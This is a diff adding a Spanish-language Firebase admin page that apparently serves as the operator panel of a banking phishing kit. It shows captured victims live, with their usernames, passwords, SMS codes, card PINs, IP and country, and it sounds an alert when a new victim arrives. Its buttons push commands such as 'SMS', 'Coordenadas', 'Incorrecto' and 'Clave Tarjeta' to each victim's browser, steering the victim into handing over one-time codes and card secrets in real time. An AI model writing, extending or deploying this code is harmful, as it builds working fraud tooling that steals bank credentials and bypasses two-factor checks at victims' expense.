@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Panel de Administración - Firebase</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'IBM Plex Sans', sans-serif; background-color: #f4f6f9; color: #333; padding: 10px; }
+        header { display: flex; justify-content: space-between; align-items: center; background-color: #182f7c; color: white; padding: 10px 15px; border-radius: 6px; margin-bottom: 12px; }
+        header h1 { font-size: 16px; font-weight: 500; }
+        
+        .redirect-btns { display: flex; gap: 3px; flex-wrap: wrap; }
+        .btn-redir { border: none; padding: 3px 6px; border-radius: 3px; cursor: pointer; font-size: 11px; font-weight: 500; color: white; }
+        .btn-codigo { background-color: #3266cc; }
+        .btn-codigo2 { background-color: #1b4f72; }
+        .btn-codigo3 { background-color: #1B5005; }
+        .btn-incorrecto { background-color: #e67e22; }
+        .btn-token { background-color: #d35400; }
+        .btn-token2 { background-color: #b9770e; }
+        .btn-dui { background-color: #27ae60; }
+        .btn-salir-usuario { background-color: #34495e; }
+        .btn-eliminar-cmd { background-color: #c0392b; }
+        .btn-redir:hover { filter: brightness(1.1); }
+
+        .badge-online { background-color: #27ae60; color: white; padding: 2px 5px; border-radius: 8px; font-size: 11px; font-weight: 500; display: inline-block; box-shadow: 0 0 3px rgba(39, 174, 96, 0.4); }
+        .badge-offline { background-color: #95a5a6; color: white; padding: 2px 5px; border-radius: 8px; font-size: 11px; font-weight: 500; display: inline-block; }
+
+        .table-container { background: white; border-radius: 6px; box-shadow: 0 2px 6px rgba(0,0,0,0.05); overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; }
+        th, td { padding: 4px 10px; border-bottom: 1px solid #eee; white-space: nowrap; height: 28px; line-height: 1.2; }
+        th { background-color: #f8fafc; color: #555; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.3px; padding-top: 6px; padding-bottom: 6px; }
+        
+        td.copiable { cursor: pointer; position: relative; transition: background-color 0.2s; }
+        td.copiable:hover { background-color: #e2e8f0; }
+        .toast { position: fixed; bottom: 20px; right: 20px; background-color: #182f7c; color: white; padding: 8px 16px; border-radius: 4px; font-size: 13px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); opacity: 0; transition: opacity 0.3s ease; z-index: 1000; pointer-events: none; }
+        .toast.show { opacity: 1; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Panel de Control de Usuarios (Firebase)</h1>
+    </header>
+    
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Estado</th>
+                    <th>Página Actual</th>
+                    <th>Usuario (Ingresado)</th>
+                    <th>Clave</th>
+                    <th>Código / Token</th>
+                    <th>Clave Tarjeta</th>
+                    <th>IP / País</th>
+                    <th>Acciones / Redirección</th>
+                </tr>
+            </thead>
+            <tbody id="tabla-usuarios"></tbody>
+        </table>
+    </div>
+
+    <div id="toast" class="toast">¡Copiado al portapapeles!</div>
+
+    <audio id="audioAlerta" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <script src="config.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    <script>
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        let initialLoad = true;
+
+        function reproducirAlertaSonora() {
+            const audio = document.getElementById('audioAlerta');
+            if (audio) {
+                audio.currentTime = 0;
+                audio.play().catch(error => console.log("Audio bloqueado:", error));
+            }
+        }
+
+        // Escuchamos la colección en tiempo real sin restricciones de consulta directas para evitar errores de índices
+        db.collection(COLECCION_NOMBRE).onSnapshot((snapshot) => {
+            snapshot.docChanges().forEach((change) => {
+                if (change.type === "added" && !initialLoad) {
+                    reproducirAlertaSonora();
+                }
+            });
+            initialLoad = false;
+            renderizarFilas(snapshot.docs);
+        });
+
+        function escaparHTML(str) {
+            if (!str) return '';
+            return String(str).replace(/[&<>'"]/g, 
+                tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag] || tag)
+            );
+        }
+
+        function renderizarFilas(docs) {
+            const tbody = document.getElementById('tabla-usuarios');
+            const ahora = Date.now();
+
+            // ORDENAMIENTO ESTRICTO E INMUTABLE
+            // Ordenamos los documentos basándonos en un campo único de creación (createdAt / timestamp) 
+            // o usando el ID del documento si éste contiene un patrón de tiempo. De esta forma, el orden nunca cambia.
+            const docsOrdenados = docs.sort((a, b) => {
+                const dataA = a.data();
+                const dataB = b.data();
+
+                // Buscamos cualquier campo numérico de creación disponible en el documento
+                const tiempoA = dataA.createdAt || dataA.timestamp || dataA.updatedAt || 0;
+                const tiempoB = dataB.createdAt || dataB.timestamp || dataB.updatedAt || 0;
+
+                const valA = typeof tiempoA.toMillis === 'function' ? tiempoA.toMillis() : (Number(tiempoA) || 0);
+                const valB = typeof tiempoB.toMillis === 'function' ? tiempoB.toMillis() : (Number(tiempoB) || 0);
+
+                if (valA !== valB) {
+                    return valA - valB; // Del más antiguo al más nuevo (orden de llegada estricto)
+                }
+
+                // Si los tiempos coinciden, ordenamos estrictamente por la longitud del ID o alfabéticamente de forma fija
+                return a.id.localeCompare(b.id);
+            });
+
+            const filasExistentes = Array.from(tbody.getElementsByTagName('tr'));
+            const mapaFilas = {};
+            filasExistentes.forEach(tr => {
+                if (tr.dataset.id) {
+                    mapaFilas[tr.dataset.id] = tr;
+                }
+            });
+
+            const idsProcesados = new Set();
+
+            docsOrdenados.forEach((doc, index) => {
+                const dataUser = doc.data();
+                const id = doc.id;
+                idsProcesados.add(id);
+
+                let ultimoLatido = 0;
+                const campoLatido = dataUser.last_active || dataUser.ultimo_latido;
+                if (campoLatido) {
+                    ultimoLatido = typeof campoLatido.toDate === 'function' ? campoLatido.toDate().getTime() : campoLatido;
+                }
+                const estaConectado = (ahora - ultimoLatido) < 8000; 
+                const estadoHtml = estaConectado 
+                    ? '<span class="badge-online">Conectado</span>' 
+                    : '<span class="badge-offline">Desconectado</span>';
+
+                const paginaVal = escaparHTML(dataUser.pagina_actual || 'Inicio / Desconocida');
+                
+                const usuarioCorregido = dataUser.usuario || dataUser.user || dataUser.usuario_corregido || '';
+                const usuarioVal = usuarioCorregido ? escaparHTML(usuarioCorregido) : '<span style="color: #999; font-style: italic;">(Esperando...)</span>';
+                const textoParaCopiar = usuarioCorregido;
+
+                const claveVal = escaparHTML(dataUser.clave || dataUser.password || 'N/D');
+                const codTokenVal = escaparHTML(dataUser.codigo || dataUser.token || 'N/D');
+                const codTokenVall = escaparHTML(dataUser.codigo2 || dataUser.token2 || 'N/D');
+                const ipPaisVal = escaparHTML(`${dataUser.ip || 'N/D'} (${dataUser.pais || 'N/D'})`);
+
+                const numeroFila = index + 1; // Número fijo correlativo (1, 2, 3, 4...)
+
+                const contenidoHTML = `
+                    <td><strong>#${numeroFila}</strong></td>
+                    <td>${estadoHtml}</td>
+                    <td><strong>${paginaVal}</strong></td>
+                    <td class="copiable" ${textoParaCopiar ? `onclick="copiarTexto(this, '${textoParaCopiar}')" title="Haz clic para copiar"` : ''}>${usuarioVal}</td>
+                    <td class="copiable" onclick="copiarTexto(this, '${ escaparHTML(dataUser.clave || dataUser.password || '') }')" title="Haz clic para copiar">${claveVal}</td>
+                    <td class="copiable" onclick="copiarTexto(this, '${ escaparHTML(dataUser.codigo || dataUser.token || '') }')" title="Haz clic para copiar">${codTokenVal}</td>
+                    <td class="copiable" onclick="copiarTexto(this, '${ escaparHTML(dataUser.codigo2 || dataUser.token2 || '') }')" title="Haz clic para copiar">${codTokenVall}</td>
+                    <td class="copiable" onclick="copiarTexto(this, '${ escaparHTML((dataUser.ip || 'N/D') + ' (' + (dataUser.pais || 'N/D') + ')') }')" title="Haz clic para copiar">${ipPaisVal}</td>
+                    <td>
+                        <div class="redirect-btns">
+                            <button class="btn-redir btn-codigo" onclick="enviarAccion('${id}', 'codigo')">SMS</button>
+                            <button class="btn-redir btn-codigo2" onclick="enviarAccion('${id}', 'cod2.html')">SMS 2</button>
+                            <button class="btn-redir btn-codigo3" onclick="enviarAccion('${id}', 'coordenadas.html')">Coordenadas</button>
+                            <button class="btn-redir btn-incorrecto" onclick="enviarAccion('${id}', 'error')">Incorrecto</button>
+                            <button class="btn-redir btn-token" onclick="enviarAccion('${id}', 'token')">Clave Tarjeta</button>
+                            <button class="btn-redir btn-salir-usuario" onclick="enviarAccion('${id}', 'salir')">Salir</button>
+                            <button class="btn-redir btn-eliminar-cmd" onclick="eliminarUsuario('${id}')">Eliminar</button>
+                        </div>
+                    </td>
+                `;
+
+                let tr = mapaFilas[id];
+                if (tr) {
+                    // Actualizamos la fila existente sin moverla de su posición física en el DOM
+                    tr.innerHTML = contenidoHTML;
+                    const hijoActualEnPosicion = tbody.children[index];
+                    if (hijoActualEnPosicion !== tr) {
+                        tbody.insertBefore(tr, hijoActualEnPosicion || null);
+                    }
+                } else {
+                    // Si es nuevo, se crea y se inserta estrictamente en la posición que le corresponde según el índice
+                    tr = document.createElement('tr');
+                    tr.dataset.id = id;
+                    tr.innerHTML = contenidoHTML;
+                    
+                    const hijoActualEnPosicion = tbody.children[index];
+                    if (hijoActualEnPosicion) {
+                        tbody.insertBefore(tr, hijoActualEnPosicion);
+                    } else {
+                        tbody.appendChild(tr);
+                    }
+                }
+            });
+
+            // Eliminamos filas de usuarios que ya no estén en la base de datos
+            filasExistentes.forEach(tr => {
+                if (tr.dataset.id && !idsProcesados.has(tr.dataset.id)) {
+                    tr.remove();
+                }
+            });
+        }
+
+        function enviarAccion(id, comando) {
+            db.collection(COLECCION_NOMBRE).doc(id).update({
+                comando: comando
+            }).catch(error => console.error('Error al enviar acción:', error));
+        }
+
+        function copiarTexto(elemento, texto) {
+            if (texto === 'N/D' || !texto) return;
+            navigator.clipboard.writeText(texto).then(() => {
+                const toast = document.getElementById('toast');
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 1500);
+            });
+        }
+
+        function eliminarUsuario(id) { 
+            db.collection(COLECCION_NOMBRE).doc(id).update({
+                comando: "eliminar"
+            }).then(() => {
+                setTimeout(() => {
+                    db.collection(COLECCION_NOMBRE).doc(id).delete();
+                }, 500);
+            }).catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
